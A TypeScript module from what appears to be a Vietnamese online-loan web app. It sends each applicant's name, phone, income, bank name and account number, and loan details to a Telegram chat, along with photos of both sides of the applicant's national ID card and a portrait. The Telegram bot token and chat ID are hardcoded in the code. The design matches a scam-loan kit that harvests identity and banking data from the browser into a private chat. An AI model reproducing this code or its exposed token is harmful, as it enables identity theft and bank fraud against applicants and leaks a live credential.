
import { UserProfile, LoanRequest } from "../types";

// Cấu hình Telegram của bạn - Đã cập nhật theo yêu cầu
const TELEGRAM_BOT_TOKEN = '8005178006:AAF6dAaIT4yhwf9CBHbj-gr35jN1VfWcORU'; 
const TELEGRAM_CHAT_ID = '8525793386'; 

/**
 * Chuyển đổi Base64 sang Blob để gửi qua Telegram API
 */
const base64ToBlob = async (base64Data: string) => {
  const res = await fetch(base64Data);
  return await res.blob();
};

/**
 * Gửi tin nhắn văn bản tổng hợp thông tin hồ sơ
 */
export const sendTelegramMessage = async (profile: UserProfile, loan: LoanRequest) => {
  const message = `
🔔 **CÓ HỒ SƠ VAY MỚI!** 🔔
----------------------------
👤 **KHÁCH HÀNG:**
- Họ tên: ${profile.fullName.toUpperCase()}
- SĐT: ${profile.phone}
- Tuổi: ${profile.age}
- Nghề nghiệp: ${profile.job}
- Thu nhập: ${profile.monthlyIncome.toLocaleString('vi-VN')} VND
- Khu vực: ${profile.location}
- Hôn nhân: ${profile.maritalStatus}

🏦 **THÔNG TIN GIẢI NGÂN:**
- Ngân hàng: ${profile.bankName?.toUpperCase()}
- Số tài khoản: \`${profile.bankAccountNumber}\`

💰 **KHOẢN VAY:**
- Số tiền: ${loan.amount.toLocaleString('vi-VN')} VND
- Kỳ hạn: ${loan.termDays} ngày
----------------------------
🕒 *Thời gian: ${new Date().toLocaleString('vi-VN')}*
  `;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });
  } catch (error) {
    console.error("Lỗi gửi tin nhắn Telegram:", error);
  }
};

/**
 * Gửi ảnh hồ sơ (CCCD/Chân dung) qua Telegram
 */
export const sendTelegramPhoto = async (base64Image: string, caption: string) => {
  try {
    const blob = await base64ToBlob(base64Image);
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });
  } catch (error) {
    console.error("Lỗi gửi ảnh Telegram:", error);
  }
};

/**
 * Hàm tổng hợp gửi toàn bộ bộ hồ sơ
 */
export const sendFullApplicationToTelegram = async (profile: UserProfile, loan: LoanRequest) => {
  try {
    // 1. Gửi thông tin chữ trước
    await sendTelegramMessage(profile, loan);

    // 2. Gửi các ảnh đính kèm (gửi lần lượt để đảm bảo thứ tự)
    if (profile.idFront) {
      await sendTelegramPhoto(profile.idFront, `💳 CCCD Mặt trước: ${profile.fullName}`);
    }
    if (profile.idBack) {
      await sendTelegramPhoto(profile.idBack, `💳 CCCD Mặt sau: ${profile.fullName}`);
    }
    if (profile.portrait) {
      await sendTelegramPhoto(profile.portrait, `📸 Ảnh chân dung: ${profile.fullName}`);
    }
  } catch (err) {
    console.error("Lỗi tổng hợp gửi Telegram:", err);
  }
};
